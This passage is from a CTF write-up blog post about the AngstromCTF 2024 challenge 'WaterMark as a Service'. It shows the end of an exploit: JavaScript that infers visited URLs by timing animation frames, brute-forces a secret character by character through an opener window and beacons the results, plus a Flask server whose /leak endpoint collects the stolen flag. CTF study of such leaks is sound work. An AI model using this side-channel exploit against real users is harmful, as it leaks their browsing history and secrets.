                                opener.location.href = `/?query=${Math.random()}&amp;ratio=${ratio}#${guess}${current_guess}|a`;
                            }
                        }
                        else {
                            let charset = &#39;{{ CHARSET }}&#39;.split(&#39;&#39;);
                            if (opener) {
                                opener.location.href = `/?query=${Math.random()}&amp;ratio=${ratio}#${guess}|${charset[charset.indexOf(current_guess)+1]}`;
                            }
                        }
                    }
                    sendBeacon(likelyVisited);

                    document.body.style.overflow = &#39;visible&#39;;
                    
                    var outputDom = document.createElement(&#39;p&#39;);
                    
                    outputDom.appendChild(document.createTextNode(&#39;Result for &#39;));
                    
                    var linkDom = document.createElement(&#39;a&#39;);
                    linkDom.href = experimentUrl;
                    linkDom.appendChild(document.createTextNode(experimentUrl));
                    outputDom.appendChild(linkDom);
                    
                    outputDom.appendChild(document.createTextNode(&#39;: likely &#39;));
                    
                    var resultDom = document.createElement(&#39;strong&#39;);
                    resultDom.innerHTML = likelyVisited ? &#39;VISITED&#39; : &#39;UNVISITED&#39;;
                    resultDom.style.color = likelyVisited ? &#39;green&#39; : &#39;red&#39;;
                    outputDom.appendChild(resultDom);
                    
                    outputDom.appendChild(document.createTextNode(
                        &#39; (&#39; + experimentTickCount + &#39; ticks vs &#39; +
                        controlTickCount + &#39; ticks; ratio = &#39; +
                        Math.round(ratio * 100) + &#39;%).&#39;));
                    
                    document.body.appendChild(outputDom);
                    
                    var retryButton = document.createElement(&#39;button&#39;);
                    retryButton.innerHTML = &#39;Try Another URL&#39;;
                    retryButton.addEventListener(&#39;click&#39;, function (e) {
                        location.reload();
                    });
                    document.body.appendChild(retryButton);
                    retryButton.focus();
                }, 500);
            } 
                
            var oscillateInterval;
            var isPointingToBasisUrl = true;
            function startOscillatingHref (testUrl) {
                oscillateInterval = setInterval(function () {
                    targetLink.href = isPointingToBasisUrl ? testUrl : basisUrl;
                    isPointingToBasisUrl = !isPointingToBasisUrl;
                }, 0);
            }
            function stopOscillatingHref () {
                clearInterval(oscillateInterval);
                targetLink.href = basisUrl;
                isPointingToBasisUrl = true;
            }

            var tickCount = 0;
            var tickRequestId;
            function startCountingTicks () {
                tickRequestId = requestAnimationFrame(function () {
                    ++tickCount;
                    startCountingTicks();
                });
            }
            function stopCountingTicks () {
                cancelAnimationFrame(tickRequestId);
                var oldTickCount = tickCount;
                tickCount = 0;
                return oldTickCount;
            }
        })();
        
        setTimeout(function () {
            var testButton = document.getElementById(&#39;testButton&#39;);
            testButton.click();
        }, 1000);
   
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
&#39;&#39;&#39;

@app.route(&#39;/&#39;)
def index():
    return render_template_string(ex_html, CHALLENGE_URL=URL,CHARSET=CHARSET)

@app.route(&#39;/poc&#39;)
def poc():
    args = request.args.get(&#39;url&#39;)
    return render_template_string(poc_html, url=args, CHALLENGE_URL=URL,CHARSET=CHARSET)

@app.route(&#39;/leak&#39;)
def leak():
    flag = request.args.get(&#39;flag&#39;)
    if flag[-1] == &#39;}&#39;:
        print(flag)
    return &#34;&#34;

if __name__ == &#39;__main__&#39;:
    app.run(host=&#39;0.0.0.0&#39;,port=1337)
</code></pre>

        
          <div class="blog-tags">
            
              <a href="https://Alfinj0se.github.io//tags/writeups/">writeups</a>&nbsp;
            
          </div>
        

        
            <hr/>
            <section id="social-share">
              <div class="list-inline footer-links">
                

<div class="share-box" aria-hidden="true">
    <ul class="share">
      
      <li>
        <a href="//twitter.com/share?url=https%3a%2f%2fAlfinj0se.github.io%2fposts%2fangstromctf2024%2f&amp;text=WaterMark%20as%20a%20Service%20AngstromCTF&amp;via=Alfinjoseph19" target="_blank" title="Share on Twitter">
          <i class="fab fa-twitter"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fAlfinj0se.github.io%2fposts%2fangstromctf2024%2f" target="_blank" title="Share on Facebook">
          <i class="fab fa-facebook"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//reddit.com/submit?url=https%3a%2f%2fAlfinj0se.github.io%2fposts%2fangstromctf2024%2f&amp;title=WaterMark%20as%20a%20Service%20AngstromCTF" target="_blank" title="Share on Reddit">
          <i class="fab fa-reddit"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fAlfinj0se.github.io%2fposts%2fangstromctf2024%2f&amp;title=WaterMark%20as%20a%20Service%20AngstromCTF" target="_blank" title="Share on LinkedIn">
          <i class="fab fa-linkedin"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fAlfinj0se.github.io%2fposts%2fangstromctf2024%2f&amp;title=WaterMark%20as%20a%20Service%20AngstromCTF" target="_blank" title="Share on StumbleUpon">
          <i class="fab fa-stumbleupon"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//www.pinterest.com/pin/create/button/?url=https%3a%2f%2fAlfinj0se.github.io%2fposts%2fangstromctf2024%2f&amp;description=WaterMark%20as%20a%20Service%20AngstromCTF" target="_blank" title="Share on Pinterest">
          <i class="fab fa-pinterest"></i>
        </a>
      </li>
    </ul>
  </div>
  

              </div>
            </section>
        

        
          
            
          

          
                  <h4 class="see-also">See also</h4>
                  <ul>
                
                
                    <li><a href="/posts/paaad-hackluctf2023/">p√§√§√§d - Hack.lu CTF 2023 </a></li>
                
              </ul>

          
        
      </article>

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="https://Alfinj0se.github.io/posts/paaad-hackluctf2023/" data-toggle="tooltip" data-placement="top" title="p√§√§√§d - Hack.lu CTF 2023 ">&larr; Previous Post</a>
            </li>
          
          
        </ul>
      


      

    </div>
  </div>
</div>

      
<footer>
  <div class="container">
    
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
              <li>
		
		  <a href="https://github.com/AlfinJ0se/" title="GitHub">
		
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li>
		
		  <a href="https://twitter.com/Alfinjoseph19" title="Twitter">
		
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li>
		
		  <a href="https://discord.gg/alfin3133" title="Discord">
		
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fab fa-discord fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
          
        </ul>
        <p class="credits copyright text-muted">
          
            
              <a href="https://Alfinj0se.github.io">Alfin Joseph</a>
            
          

          &nbsp;&bull;&nbsp;&copy;
          
            2024
          

          
            &nbsp;&bull;&nbsp;
            <a href="https://Alfinj0se.github.io/">Alfins Notes</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="https://gohugo.io">Hugo v0.126.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
          
        </p>
      </div>
    </div>
  </div>
</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>

<script src="https://Alfinj0se.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://Alfinj0se.github.io/js/load-photoswipe.js"></script>









    
  </body>
</html>

